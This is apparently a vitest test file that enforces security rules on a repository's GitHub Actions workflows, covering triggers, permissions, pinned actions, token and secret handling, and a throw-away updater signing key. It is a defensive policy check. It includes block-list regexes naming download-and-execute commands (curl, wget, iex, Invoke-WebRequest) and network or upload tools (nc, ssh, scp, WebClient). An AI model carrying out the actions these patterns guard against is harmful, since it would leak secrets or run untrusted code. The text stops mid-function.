import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { load as loadYaml } from 'js-yaml'
import { describe, expect, it } from 'vitest'

/**
 * The rules every GitHub Actions workflow of this public repository keeps (Phase 17, docs/DECISIONS.md; tightened
 * by the security review, SR-049). On a public repo a push or pull-request trigger lets a stranger's change run here,
 * wider permissions let a run write to the repo, an action named by tag can be changed under us by whoever controls
 * that tag, and a script that is handed text it did not write runs it. A change to any of these is a decision, so it
 * has to change this test too.
 *
 * One function, `workflowProblems`, holds every rule. It runs on each real workflow (which must have none) and on
 * hostile ones below (each of which must trip exactly the rule it was written for), so a rule that quietly stopped
 * working would fail here.
 */

const WORKFLOWS = join(import.meta.dirname, '../../.github/workflows')

/** `actions/<name>@<40 hex>`: GitHub's own actions only, each a commit, which no one can move. */
const PINNED_GITHUB_ACTION = /^actions\/[\w.-]+(\/[\w./-]+)?@[0-9a-f]{40}$/
/** A GitHub-hosted runner. A self-hosted runner on a public repository runs whatever a workflow says, on a machine. */
const HOSTED_RUNNER = /^(windows|macos|ubuntu)-(latest|\d[\w.]*)$/
/** The release workflow names its image: `-latest` moves to a new operating system on GitHub's schedule, mid-release (20.4). */
const NUMBERED_RUNNER = /^(windows|macos|ubuntu)-\d[\w.]*$/
/**
 * The updater key never reaches a workflow (20.12a, SR-063). `tauri build` needs a key to bundle update files at all, so each release build
 * job makes a throw-away one for itself and points `TAURI_SIGNING_PRIVATE_KEY` at that file, for the build step only. This is the only
 * value the variable may have, and the password is empty because `signer generate --ci` makes the key without one.
 */
const THROWAWAY_KEY = '${{ runner.temp }}/updater-throwaway.key'
/** The overlay (not the shared config) switches the update files on, so only the release build needs a key. */
const UPDATER_OVERLAY = 'src-tauri/tauri.updater-artifacts.conf.json'
/** The release workflow runs on a pushed version tag and on nothing else (Phase 20, task 20.4): no branch, no button, no input. */
const RELEASE_TRIGGER = JSON.stringify({ push: { tags: ['v*'] } })
/**
 * The CI workflow runs on a push to `main` and by hand, and on nothing else (Phase 31, task 31.1; docs/DECISIONS.md): no pull request (a
 * stranger's change would run here), no other branch or tag, no schedule, no input. `main` is where the owner pushes; a green run on a commit
 * is what `release:prepare` waits for.
 */
const CI_TRIGGER = JSON.stringify({ push: { branches: ['main'] }, workflow_dispatch: null })
/** The longest a CI job may run: a hung job must end, and a run is billed in minutes. */
const MAX_CI_MINUTES = 90
/**
 * The canary (Phase 31, task 31.9) runs once a day on a schedule and by hand, and on nothing else. The cron may be any daily time, so moving
 * it is not a decision; an hourly or weekly one is.
 */
const CANARY_CRON = /^\d{1,2} \d{1,2} \* \* \*$/
/** The only commands a canary job runs; the first has no token, the other two are the ones that hold the workflow's read-only token. */
const CANARY_INSTALL = 'npm ci --ignore-scripts'
const CANARY_TOKEN_COMMANDS = ['npm run release:verify', 'npm run canary:install']
/**
 * Everything a canary may say, by level. A key that is not on a list is a refusal: `env` at the workflow or job level reaches every step
 * (a NODE_OPTIONS next to the token loads code into the step that holds it), `defaults`, `shell`, `working-directory` and `if` change what
 * a step runs, a `container`, `services` or `strategy` change where, and an action other than the two named reads the workflow token by
 * default. Each is a decision, so each has to change this test.
 */
const CANARY_WORKFLOW_KEYS = ['name', 'on', 'permissions', 'jobs']
const CANARY_JOB_KEYS = ['runs-on', 'timeout-minutes', 'permissions', 'steps']
const CANARY_STEP_KEYS = ['name', 'uses', 'with', 'run', 'env']
const CANARY_ACTION_INPUTS: Record<string, string[]> = { 'actions/checkout': ['persist-credentials'], 'actions/setup-node': ['node-version-file'] }

/**
 * `manual`: a test build, started by hand, read-only, no token (Phase 17). `release`: runs on a pushed `v*` tag, builds with read-only
 * permissions and no token, and one job, `publish`, may write to the repository to create a DRAFT Release (Phase 20, task 20.4). `ci`: runs on a
 * push to `main` and by hand, read-only, no token, no secret, uploads nothing (Phase 31, task 31.1). `updaterTest`: the manual rules, plus
 * the rules for the one workflow that makes a THROW-AWAY signing key for its run (Phase 31, task 31.6, rules S1 to S4 of the plan). `canary`: runs
 * once a day and by hand, read-only, and holds the workflow's own read-only token for exactly two commands (Phase 31, task 31.9, rules S4 and S7).
 */
type Profile = 'manual' | 'release' | 'ci' | 'canary' | 'updaterTest'
/** The longest an artifact may live: a test build is unannounced, not a release (DECISIONS 2026-10-05). */
const MAX_RETENTION_DAYS = 7

interface Step {
  uses?: string
  if?: unknown
  name?: string
  run?: string
  env?: Record<string, unknown>
  with?: Record<string, unknown>
  'continue-on-error'?: unknown
}

interface Job {
  needs?: unknown
  'runs-on'?: unknown
  permissions?: unknown
  uses?: string
  env?: unknown
  secrets?: unknown
  environment?: unknown
  'continue-on-error'?: unknown
  'timeout-minutes'?: unknown
  outputs?: unknown
  steps?: Step[]
}

interface Workflow {
  on: unknown
  env?: unknown
  permissions?: unknown
  jobs: Record<string, Job>
}

/** Every string anywhere in a parsed document, with the key it sits under. */
function strings(value: unknown, key = ''): [string, string][] {
  if (typeof value === 'string') return [[key, value]]
  if (Array.isArray(value)) return value.flatMap((item) => strings(item, key))
  if (typeof value === 'object' && value !== null) {
    return Object.entries(value).flatMap(([name, inner]) => strings(inner, name))
  }

  return []
}

/** Every rule a workflow breaks, as sentences; empty when it breaks none. */
function workflowProblems(workflow: Workflow, profile: Profile = 'manual'): string[] {
  const problems: string[] = []
  const jobs = Object.entries(workflow.jobs)
  const steps = jobs.flatMap(([name, job]) => (job.steps ?? []).map((step) => ({ job: name, step })))

  // Started by hand only: no push or pull-request trigger, so no stranger's change is ever built.
  const triggers = typeof workflow.on === 'string' ? [workflow.on] : Object.keys((workflow.on ?? {}) as object)
  if ((profile === 'manual' || profile === 'updaterTest') && JSON.stringify(triggers) !== JSON.stringify(['workflow_dispatch'])) {
    problems.push(`is started by ${triggers.join(', ') || 'nothing'}, not by hand only (workflow_dispatch)`)
  }
  if (profile === 'release' && JSON.stringify(workflow.on) !== RELEASE_TRIGGER) {
    problems.push(`is started by ${JSON.stringify(workflow.on)}, not only by a pushed v* tag`)
  }
  if (profile === 'ci' && JSON.stringify(workflow.on) !== CI_TRIGGER) {
    problems.push(`is started by ${JSON.stringify(workflow.on)}, not only by a push to main and by hand (no input)`)
  }

  if (profile === 'canary') {
    const on = (typeof workflow.on === 'object' && workflow.on !== null ? workflow.on : {}) as { schedule?: unknown; workflow_dispatch?: unknown }
    const schedule = Array.isArray(on.schedule) ? (on.schedule as unknown[]) : []
    const entry = schedule[0] as Record<string, unknown> | undefined
    const oneDailyCron = schedule.length === 1 && entry !== undefined && JSON.stringify(Object.keys(entry)) === '["cron"]' && typeof entry['cron'] === 'string' && CANARY_CRON.test(entry['cron'])
    if (JSON.stringify(Object.keys(on)) !== '["schedule","workflow_dispatch"]' || !oneDailyCron || on.workflow_dispatch !== null) {
      problems.push(`is started by ${JSON.stringify(workflow.on)}, not only by one daily schedule and by hand (no input)`)
    }
  }

  // Reads the repository and nothing more.
  if (JSON.stringify(workflow.permissions) !== JSON.stringify({ contents: 'read' })) problems.push('does not have permissions: { contents: read }')
  for (const [name, job] of jobs) {
    // Only `publish` may write, and only contents (a draft Release); only `attest` may mint a signing token and write an attestation
    // (20.6), and it writes nothing else; a build job never does either.
    const allowed: Record<string, string>[] = [{ contents: 'read' }]
    if (profile === 'release' && name === 'publish') allowed.push({ contents: 'write' })
    if (profile === 'release' && name === 'attest') allowed.push({ contents: 'read', 'id-token': 'write', attestations: 'write' })
    const same = (a: unknown, b: unknown) => JSON.stringify(Object.entries(a as object).sort()) === JSON.stringify(Object.entries(b as object).sort())
    if (job.permissions !== undefined && !allowed.some((set) => same(set, job.permissions))) {
      problems.push(`job ${name} widens its permissions`)
    }
  }

  // GitHub's own actions, each pinned by commit (a job may call a reusable workflow with `uses`, a step an action).
  const uses = [...jobs.flatMap(([, job]) => (job.uses ? [job.uses] : [])), ...steps.flatMap(({ step }) => (step.uses ? [step.uses] : []))]
  if (uses.length === 0) problems.push('uses no action at all (an empty list would pass every rule below on nothing)')
  for (const use of uses) if (!PINNED_GITHUB_ACTION.test(use)) problems.push(`uses ${use}: not a GitHub-owned action pinned by a 40-character commit`)

  // A GitHub-hosted runner only.
  for (const [name, job] of jobs) {
    if (typeof job['runs-on'] !== 'string' || !HOSTED_RUNNER.test(job['runs-on'])) {
      problems.push(`job ${name} runs on ${JSON.stringify(job['runs-on'])}, not a GitHub-hosted runner`)
    } else if (profile !== 'manual' && !NUMBERED_RUNNER.test(job['runs-on'])) {
      problems.push(`job ${name} runs on ${job['runs-on']}: a release or a CI run names its image (windows-2025), never -latest`)
    }
  }

  // The checkout does not leave a token in `.git/config` for the build's scripts to read.
  for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/checkout@'))) {
    if (step.with?.['persist-credentials'] !== false) problems.push(`job ${job}: checkout does not set persist-credentials: false`)
  }

  // An artifact is a test build kept for days, not a release.
  for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/upload-artifact@'))) {
    const days = step.with?.['retention-days']
    if (typeof days !== 'number' || days < 1 || days > MAX_RETENTION_DAYS) {
      problems.push(`job ${job}: upload-artifact retention-days is ${JSON.stringify(days)}, not 1 to ${MAX_RETENTION_DAYS}`)
    }
  }

  // A script is handed values through `env:`, never pasted: `${{ … }}` in a `run:` is text written into the script
  // before it runs, so whoever sets that value (an input, a branch name, an actor) writes shell. And it fetches and
  // runs nothing it did not pin: no download piped to a shell, no `npx` of a package named on the fly.
  for (const { job, step } of steps.filter(({ step }) => step.run !== undefined)) {
    const run = step.run!
    if (run.includes('${{')) problems.push(`job ${job}: a run: script contains \${{ … }} (hand values through env:)`)
    if (/\b(curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Invoke-Expression|iex)\b/i.test(run)) {
      problems.push(`job ${job}: a run: script downloads or evaluates remote text`)
    }
    if (/\bnpx\b/.test(run)) problems.push(`job ${job}: a run: script uses npx`)
  }

  // The toolchain is the one the repository names, never "whatever is current today" (SR-041): Node comes from `.node-version`,
  // Rust from `rust-toolchain.toml`, and a build resolves its dependencies from the committed lockfiles or fails (`--locked`).
  for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/setup-node@'))) {
    if (step.with?.['node-version'] !== undefined) problems.push(`job ${job}: setup-node names a node-version (read .node-version instead)`)
    if (step.with?.['node-version-file'] !== '.node-version') problems.push(`job ${job}: setup-node does not read .node-version`)
  }
  for (const { job, step } of steps.filter(({ step }) => step.run !== undefined)) {
    const run = step.run!
    if (/\brustup\s+(toolchain\s+install|default|update|override)\b/.test(run)) {
      if (/\b(stable|beta|nightly)\b/.test(run)) problems.push(`job ${job}: rustup is given a moving channel (stable, beta or nightly)`)
      if (!run.includes('rust-toolchain.toml')) problems.push(`job ${job}: rustup does not take its version from rust-toolchain.toml`)
    }
    for (const line of run.split('\n')) {
      if (/\b(tauri:build|tauri build|cargo\s+(build|test|run|check|clippy|install|bench))\b/.test(line) && !/--locked\b/.test(line)) {
        problems.push(`job ${job}: \`${line.trim().slice(0, 70)}\` is not run with --locked`)
      }
    }
  }

  // No secret, and no token handed on, in any spelling: the key `secrets:` of a reusable-workflow call
  // (`secrets: inherit`), `${{ secrets.X }}`, `secrets['X']`, `toJSON(secrets)`, `github.token`, `GITHUB_TOKEN`.
  for (const [name, job] of jobs) if (job.secrets !== undefined) problems.push(`job ${name} passes secrets`)
  // The release workflow's `publish` job hands the token to the GitHub CLI as GH_TOKEN, once, to create the draft; nowhere else.
  const rest = Object.fromEntries(Object.entries(workflow).filter(([key]) => key !== 'jobs'))
  const scopes: [string, unknown][] = [['', rest], ...jobs.map(([name, job]): [string, unknown] => [name, job])]
  for (const [scope, value] of scopes) {
    for (const [key, text] of strings(value)) {
      // `github.token`, and the same token reached another way (`github['token']`): the whole context as text is refused by the exact-value rule.
      const token = /\bgithub\.token\b|\bGITHUB_TOKEN\b|\bgithub\s*\[/.test(text)
      const handed = (profile === 'release' && scope === 'publish' && key === 'GH_TOKEN' && text === '${{ github.token }}') || (profile === 'canary' && scope !== '' && key === 'GH_TOKEN' && text === '${{ github.token }}')
      // [\s\S]*, not [^}]*: a `}` inside the expression (format('{0}', secrets.X)) must not hide what follows it.
      if (/\$\{\{[\s\S]*\bsecrets\b/.test(text) || (token && !handed)) {
        problems.push(`${key || 'a value'} reaches for a secret or the token: ${text.slice(0, 60)}`)
      }
    }
  }

  // No repository variable either: the updater key (or anything else) is not read from `vars` (20.12a).
  for (const [scope, value] of scopes) {
    for (const [key, text] of strings(value)) {
      if (/\$\{\{[\s\S]*\bvars\b/.test(text)) problems.push(`${scope || 'the workflow'}: ${key || 'a value'} reads a repository variable: ${text.slice(0, 60)}`)
    }
  }

  // Only the release workflow builds update files: nothing else names the updater key variables or the overlay that switches them on.
  if (profile !== 'release' && /TAURI_SIGNING|tauri\.updater-artifacts/.test(JSON.stringify(workflow))) {
    problems.push('names the updater key or the updater-artifacts overlay (only the release workflow builds update files)')
  }

  if (profile === 'release' && /TAURI_SIGNING/.test(JSON.stringify(rest))) problems.push('names the updater key at the workflow level (it is for one build step only)')

  // A CI run uploads nothing: the logs and the artifacts of a public repository can be read by anyone (Phase 31, rule S2), and a test run has
  // nothing to publish. A job also names its time limit, so a hung run ends.
  if (profile === 'ci' || profile === 'canary') {
    for (const { job } of steps.filter(({ step }) => step.uses?.startsWith('actions/upload-artifact@'))) {
      problems.push(`job ${job}: uploads an artifact (a ${profile === 'ci' ? 'CI' : 'canary'} run uploads nothing)`)
    }
    for (const [name, job] of jobs) {
      const minutes = job['timeout-minutes']
      if (typeof minutes !== 'number' || minutes < 1 || minutes > MAX_CI_MINUTES) {
        problems.push(`job ${name}: timeout-minutes is ${JSON.stringify(minutes)}, not 1 to ${MAX_CI_MINUTES}`)
      }
    }
  }

  // A signature file is never uploaded: the throw-away ones are discarded, the owner's are added by hand. The one exception is the updater test
  // workflow, whose test update's signature IS the file the test serves; its own rules (updaterTestProblems) allow exactly that file by name.
  if (profile !== 'updaterTest') {
    for (const { job, step } of steps.filter(({ step }) => step.uses?.startsWith('actions/upload-artifact@'))) {
      if (/\.sig\b/.test(String(step.with?.path ?? ''))) problems.push(`job ${job}: upload-artifact takes a .sig file (a signature never leaves the runner)`)
    }
  }

  // Nothing is allowed to fail quietly, and no environment (with its own secrets and reviewers) is in play.
  for (const [name, job] of jobs) {
    if (job['continue-on-error'] !== undefined) problems.push(`job ${name} sets continue-on-error`)
    if (job.environment !== undefined) problems.push(`job ${name} uses an environment`)
  }
  for (const { job, step } of steps) if (step['continue-on-error'] !== undefined) problems.push(`job ${job}: a step sets continue-on-error`)

  if (profile === 'canary') problems.push(...canaryProblems(workflow, jobs, steps))
  if (profile === 'release') problems.push(...releaseProblems(jobs, steps))
  if (profile === 'updaterTest') problems.push(...updaterTestProblems(workflow))

  return problems
}

/**
 * What only the canary must do (Phase 31, task 31.9). It reads from GitHub every day with the workflow's own read-only token, with nobody
 * watching, so it is given nothing it does not need: the token goes to the two steps that call GitHub and to no other, and a job runs only
 * the three commands it is for. The dependencies are installed WITHOUT their scripts, in a step that has no token, before the token-holding
 * step runs; and nothing is cached (a restored cache is code that the next step may run).
 */
function canaryProblems(workflow: Workflow, jobs: [string, Job][], steps: { job: string; step: Step }[]): string[] {
  const problems: string[] = []
  for (const key of Object.keys(workflow)) if (!CANARY_WORKFLOW_KEYS.includes(key)) problems.push(`uses the workflow key ${key} (a canary says only ${CANARY_WORKFLOW_KEYS.join(', ')})`)
  for (const [name, job] of jobs) {
    for (const key of Object.keys(job)) if (!CANARY_JOB_KEYS.includes(key)) problems.push(`job ${name} uses the job key ${key} (a canary job says only ${CANARY_JOB_KEYS.join(', ')})`)
  }
  for (const [name, job] of jobs) {
    if (/\bgithub\.token\b|\bGITHUB_TOKEN\b|\bGH_TOKEN\b/.test(JSON.stringify(job.env ?? {}))) problems.push(`job ${name} hands the token to every step (give it to the one step that calls GitHub)`)
  }
  for (const { job, step } of steps) {
    const run = step.run?.trim()
    for (const key of Object.keys(step)) if (!CANARY_STEP_KEYS.includes(key)) problems.push(`job ${job}: uses the step key ${key} (a canary step says only ${CANARY_STEP_KEYS.join(', ')})`)
    if (step.uses !== undefined) {
      const action = step.uses.split('@')[0]!
      const inputs = CANARY_ACTION_INPUTS[action]
      if (inputs === undefined) problems.push(`job ${job}: uses an action other than checkout and setup-node (${action}): an action may read the workflow token by default`)
      else if (JSON.stringify(Object.keys(step.with ?? {}).sort()) !== JSON.stringify(inputs)) problems.push(`job ${job}: ${action} takes with: only ${inputs.join(', ')}`)
    }
    if (run !== undefined && run !== CANARY_INSTALL && !CANARY_TOKEN_COMMANDS.includes(run)) {
      problems.push(`job ${job}: runs ${JSON.stringify(run.slice(0, 60))}, which is not one of the canary's commands (${[CANARY_INSTALL, ...CANARY_TOKEN_COMMANDS].join(', ')})`)
    }
    const holdsToken = step.env !== undefined && Object.keys(step.env).some((key) => /^(GH_TOKEN|GITHUB_TOKEN)$/.test(key))
    if (step.env !== undefined && !holdsToken) problems.push(`job ${job}: a step sets env (only the steps that call GitHub hold anything, and that is GH_TOKEN)`)
    if (holdsToken && step.env?.['GH_TOKEN'] !== '${{ github.token }}') problems.push(`job ${job}: GH_TOKEN must be exactly \${{ github.token }}, the workflow's own read-only token (not ${JSON.stringify(step.env?.['GH_TOKEN'])?.slice(0, 40)})`)
    if (holdsToken && JSON.stringify(Object.keys(step.env ?? {})) !== '["GH_TOKEN"]') problems.push(`job ${job}: a step that holds the token may hold only GH_TOKEN, not ${Object.keys(step.env ?? {}).join(', ')}`)
    if (holdsToken && (run === undefined || !CANARY_TOKEN_COMMANDS.includes(run))) {
      problems.push(`job ${job}: a step holds the token but runs ${JSON.stringify(run?.slice(0, 60) ?? 'nothing')} (only ${CANARY_TOKEN_COMMANDS.join(' and ')} may)`)
    }
    if (step.uses?.startsWith('actions/cache@') || step.with?.['cache'] !== undefined) problems.push(`job ${job}: uses a cache (a restored cache is code the token-holding step may run)`)
  }

  return problems
}

/**
 * What only the updater test workflow must do (Phase 31, task 31.6; rules S1 to S4 of docs/tasks/plan.md). It makes a signing key for ONE
 * run, builds a test app that trusts only that key, signs the update with it and throws the key away. The repository is public, and so are
 * its logs and its artifacts, so the key is kept where nothing can pick it up: made once, in the runner's temp folder (never the checkout),
 * hidden from the log, read by nothing but the line that hides it, handed to no other step or job, uploaded nowhere, deleted at the end. The
 * artifact is a list of exact file names, so nothing else can ride along. The key can only sign a test app that embeds its own public key
 * (a release pins the real one), but that is a second line of defence, not a reason to relax these.
 */
function updaterTestProblems(workflow: Workflow): string[] {
  const problems: string[] = []
  const jobs = Object.entries(workflow.jobs)
  const steps = jobs.flatMap(([name, job]) => (job.steps ?? []).map((step) => ({ job: name, step })))
  const indexed = steps.map(({ step }, index) => ({ step, index, run: step.run ?? '' }))
  // Comments are not code: a check that is only written in a comment is not made. Blank lines go too.
  const codeOf = (run: string) => run.split('\n').map((line) => line.replace(/(^|\s)#.*$/, '').trim()).filter((line) => line !== '')
  const lines = indexed.flatMap(({ run, index }) => codeOf(run).map((line) => ({ line, index })))
  const text = JSON.stringify(workflow)

  // The key never leaves the one job: no other job to hand it to, no output, no file or variable that outlives a step.
  if (jobs.length !== 1) problems.push(`has ${jobs.length} jobs (the key must live in exactly one)`)
  for (const [name, job] of jobs) if (job.outputs !== undefined) problems.push(`job ${name} has outputs (a way to hand a value to another job)`)
  if (/GITHUB_ENV|GITHUB_OUTPUT|GITHUB_STATE|GITHUB_STEP_SUMMARY|GITHUB_PATH/.test(text)) problems.push('writes to a file that outlives a step (GITHUB_ENV, GITHUB_OUTPUT, GITHUB_STATE, GITHUB_STEP_SUMMARY or GITHUB_PATH)')
  for (const { step } of steps) {
    if (/^actions\/(cache|download-artifact)@/.test(step.uses ?? '')) problems.push(`uses ${step.uses!.split('@')[0]} (a way to carry the key between runs)`)
  }
  if (/Set-PSDebug|set -x|Start-Transcript|Trace-Command|\$VerbosePreference|\$DebugPreference|\s-Verbose\b|\s-Debug\b/.test(text)) problems.push('turns on tracing, a transcript or verbose output (anything that could print the key)')

  // One key, made with --ci (no passphrase prompt), in the runner's temp folder.
  const generating = lines.filter(({ line }) => /\bsigner\s+generate\b/.test(line))
  if (generating.length !== 1) problems.push(`makes ${generating.length} keys, not exactly one`)
  for (const { line } of generating) {
    if (!/--ci\b/.test(line)) problems.push('the key is not made with --ci')
    if (!/\s-w \$key\b/.test(line)) problems.push('the key is not written to $key')
  }
  // EVERY definition of $key, in every step: one step that points it at the checkout would put the key where an upload could reach it.
  const keyDefinitions = lines.filter(({ line }) => /^\$key\s*=/.test(line))
  if (keyDefinitions.length === 0 || keyDefinitions.some(({ line }) => !/^\$key = Join-Path \$env:RUNNER_TEMP '[\w.-]+\.key'$/.test(line))) {
    problems.push("$key is not a file in the runner's temp folder in every step (Join-Path $env:RUNNER_TEMP '…key')")
  }
  for (const { line } of lines) {
    if (/[\w-]\.key\b/.test(line) && !line.includes('$env:RUNNER_TEMP')) problems.push(`a key file is named outside the runner's temp folder: ${line.slice(0, 70)}`)
  }

  // Hidden in the log before it is used, and read by that line alone: nothing prints it, copies it or moves it.
  const hiding = lines.filter(({ line }) => line.includes('::add-mask::'))
  const making = indexed.find(({ run }) => /\bsigner\s+generate\b/.test(run))
  if (hiding.length === 0) problems.push('does not hide the key in the log (::add-mask::)')
  else if (making !== undefined && hiding.some(({ index }) => index < making.index)) problems.push('hides the key before it exists')
  for (const { line } of lines) {
    if (/\b(Get-Content|cat|type|gc|Out-File|Set-Content|Add-Content|Copy-Item|Move-Item|Write-Output|Write-Host|Write-Warning|Write-Error|echo|Tee-Object|Select-String|Compress-Archive)\b.*\$key\b/.test(line) && !line.includes('::add-mask::')) {
      problems.push(`reads or prints the key outside the line that hides it: ${line.slice(0, 70)}`)
    }
  }

  // Signs with the file, never with the key text on a command line or in a variable.
  for (const { line } of lines.filter(({ line }) => /\bsigner\s+sign\b/.test(line))) {
    if (!/\s-f \$key\b/.test(line)) problems.push('signs with something other than the key file ($key)')
    if (/\s(-k|--private-key)\b/.test(line)) problems.push('signs with the key text on the command line')
    // One token: npm is npm.cmd, and a batch file's argument list drops an empty '' argument, which would leave a bare -p to swallow the next flag.
    if (!/\s--password=(\s|$)/.test(line)) problems.push('does not give the empty passphrase of a --ci key as one token (--password=)')
    if (!/--app-version\b/.test(line)) problems.push('signs without --app-version (the plugin binds a signature to a version)')
  }
  if (!lines.some(({ line }) => /\bsigner\s+sign\b/.test(line))) problems.push('never signs the update')

  // Deleted at the end, whatever happened, after the last step that uses it.
  const deleting = indexed.filter(({ step, run }) => step.if === 'always()' && /Remove-Item[^\n]*\.key/.test(run))
  const lastUse = Math.max(-1, ...lines.filter(({ line }) => /\$key\b/.test(line) && !/Remove-Item/.test(line)).map(({ index }) => index))
  if (deleting.length === 0) problems.push('does not delete the key in a step that always runs (if: always())')
  else if (!deleting.some(({ index }) => index > lastUse)) problems.push('deletes the key before its last use')

  // The checks run before anything is uploaded, and the build uses the config that trusts the run's key.
  const upload = indexed.find(({ step }) => step.uses?.startsWith('actions/upload-artifact@'))
  // The update test (31.7) runs once, as the very last thing: after the upload (a failing test must not cost the files) and after the key is
  // deleted (the test installs and drives an app and runs packages from node_modules; none of it has any use for the key, so none of it gets
  // the chance), on the folder the builds filled and no other.
  const testing = indexed.filter(({ run }) => codeOf(run).some((line) => /\btest:desktop-update\b/.test(line)))
  if (testing.length !== 1) problems.push(`runs the update test ${testing.length} times, not once`)
  for (const { run, index } of testing) {
    if (!codeOf(run).includes('npm run test:desktop-update -- updater-test-out')) problems.push('the update test is not exactly "npm run test:desktop-update -- updater-test-out"')
    if (!deleting.some((step) => step.index < index)) problems.push('runs the update test before the key is deleted')
    if (upload === undefined || index < upload.index) problems.push('runs the update test before the upload')
    if (index !== indexed.length - 1) problems.push('the update test is not the last step')
  }
  // Nothing else reaches the same code under another name (npm exec, node on the Playwright config, a path), and the step carries nothing but
  // its name, its shell and its two lines: no env (NODE_OPTIONS would run code in the one step that has the whole environment), no
  // working-directory, no extra line before or after.
  for (const { line, index } of lines) {
    if (/desktopUpdateTestRun|playwright\.desktop|e2e-desktop/.test(line) && !testing.some((step) => step.index === index)) problems.push(`runs the update test's code outside the update test step: ${line.slice(0, 70)}`)
  }
  for (const { step, run } of testing) {
    if (JSON.stringify(Object.keys(step).sort()) !== JSON.stringify(['name', 'run', 'shell']) || codeOf(run).length !== 2) problems.push('the update test step has more than its name, its shell and its two lines')
  }
  const before = (pattern: RegExp) => lines.some(({ line, index }) => pattern.test(line) && (upload === undefined || index < upload.index))
  if (!before(/updater:test-config -- verify\b/)) problems.push('does not verify the signed installer before the upload')
  if (!before(/updater:test-config -- staging\b/)) problems.push('does not check the upload folder for the key before the upload')
  if (!before(/updater:test-config -- config\b[^\n]*--out \$conf\b/)) problems.push('does not make the run config (updater:test-config config … --out $conf)')
  const confDefinitions = lines.filter(({ line }) => /^\$conf\s*=/.test(line))
  if (confDefinitions.length === 0 || confDefinitions.some(({ line }) => !/^\$conf = Join-Path \$env:RUNNER_TEMP '[\w.-]+\.json'$/.test(line))) {
    problems.push("$conf is not a file in the runner's temp folder in every step")
  }
  const building = lines.filter(({ line }) => /\btauri:build\b/.test(line))
  if (building.length !== 2) problems.push(`builds ${building.length} times, not twice (the app to install and the update)`)
  for (const { line } of building) {
    if (!/--config \$conf\b/.test(line)) problems.push('a build does not use the run config (--config $conf)')
    if (!/--bundles nsis\b/.test(line)) problems.push('a build makes more than the installer')
  }

  // Every line that touches the key, the run config or the runner's temp folder is one of these exact lines, and no other: a longer line, a
  // different path, an extra flag or a second command on the same line is refused, so nothing can be added to a step that handles the key
  // without this test noticing. (The security review of 2026-10-21 got past a pattern list with a .NET call, a path built in the line, `+=`
  // on the variable and a deletion with -WhatIf; an allowlist has no such gaps.)
  const KEY_LINES: RegExp[] = [
    /^\$key = Join-Path \$env:RUNNER_TEMP 'updater-test-run\.key'$/,
    /^\$conf = Join-Path \$env:RUNNER_TEMP 'updater-test-run\.conf\.json'$/,
    /^npm run tauri -w @listulator\/desktop -- signer generate --ci -w \$key$/,
    /^Write-Output "::add-mask::\$\(\(Get-Content \$key -Raw\)\.Trim\(\)\)"$/,
    /^npm run updater:test-config -- config --pubkey-file "\$key\.pub" --out \$conf$/,
    /^npm run tauri:build -w @listulator\/desktop -- --bundles nsis --config \$conf -- --locked$/,
    /^npm run tauri -w @listulator\/desktop -- signer sign -f \$key --password= --app-version \$env:UPDATE_VERSION \$installer$/,
    /^npm run updater:test-config -- verify --pubkey-file "\$key\.pub" --installer \$installer --version \$env:UPDATE_VERSION --installed-version \$env:VERSION$/,
    /^npm run updater:test-config -- staging --dir updater-test-out --key-file \$key$/,
    /^Remove-Item \(Join-Path \$env:RUNNER_TEMP 'updater-test-run\.key\*'\) -Force -ErrorAction SilentlyContinue$/,
  ]
  for (const { line } of lines) {
    if (/\$\{?(key|conf)\b|\.key\b|_temp\b|RUNNER_TEMP/i.test(line) && !KEY_LINES.some((allowed) => allowed.test(line))) {
      problems.push(`touches the key, the run config or the runner's temp folder outside the allowed commands: ${line.slice(0, 80)}`)
    }
  }
  if (lines.some(({ line }) => /\b(Set-Variable|New-Variable|Get-Variable|Remove-Variable|Clear-Variable|sv|gv|nv)\b/i.test(line))) problems.push('uses variable cmdlets (a way to reach $key by another name)')
  if (lines.some(({ line }) => /WebClient|HttpClient|Net\.Sockets|\bUpload(File|String|Data)\b|Start-BitsTransfer|\b(nc|ncat|ssh|scp|ftp|sftp)\b/i.test(line))) problems.push('uses a network or upload command')

  // A failed command stops the step: each one is followed by its exit-code check, and nothing forces a success.
  const EXIT_CHECK = 'if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }'
  for (const { run } of indexed) {
    const own = codeOf(run)
    own.forEach((line, at) => {
      if (/^npm run (tauri|tauri:build|updater:|version:set|test:desktop-update)/.test(line) && at < own.length - 1 && own[at + 1] !== EXIT_CHECK) {
        problems.push(`a command is not followed by its exit-code check: ${line.slice(0, 60)}`)
      }
    })
  }
  if (lines.some(({ line }) => /\bexit\s+0\b|LASTEXITCODE\s*=/.test(line))) problems.push('forces a success (exit 0 or a changed LASTEXITCODE)')

  // No step can be skipped: the only `if` is the deletion's, which is exactly always(). Nothing but three actions runs.
  for (const { step } of indexed) {
    if (step.if !== undefined && !(step.if === 'always()' && /Remove-Item/.test(step.run ?? ''))) problems.push("a step has an if: other than the deletion step's always()")
    if (step.uses !== undefined && !/^actions\/(checkout|setup-node|upload-artifact)@[0-9a-f]{40}$/.test(step.uses)) {
      problems.push(`uses ${step.uses.split('@')[0]}, outside the allowed three actions (checkout, setup-node, upload-artifact)`)
    }
  }

  // The first step checks both versions before anything else runs (before the checkout, the key and any native command that takes them).
  const first = steps[0]?.step
  const firstRun = first?.run ?? ''
  if (
    first === undefined ||
    first.uses !== undefined ||
    first.env?.['VERSION'] !== '${{ inputs.version }}' ||
    first.env?.['UPDATE_VERSION'] !== '${{ inputs.update_version }}' ||
    !/-notmatch/.test(firstRun) ||
    !/\$env:VERSION\b/.test(firstRun) ||
    !/\$env:UPDATE_VERSION\b/.test(firstRun) ||
    !/\bthrow\b/.test(firstRun)
  ) {
    problems.push('does not check the two versions first (before the checkout and before the key)')
  }

  // One artifact, an exact list of names: the two installers, the update's signature and the manifest. Nothing the key could ride along in.
  const uploads = indexed.filter(({ step }) => step.uses?.startsWith('actions/upload-artifact@'))
  if (uploads.length !== 1) problems.push(`has ${uploads.length} upload-artifact steps, not exactly one`)
  for (const { step } of uploads) {
    const paths = String(step.with?.path ?? '').split('\n').map((path) => path.trim()).filter((path) => path !== '')
    if (paths.length < 1 || paths.length > 4) problems.push(`the artifact lists ${paths.length} paths, not 1 to 4`)
    for (const path of paths) {
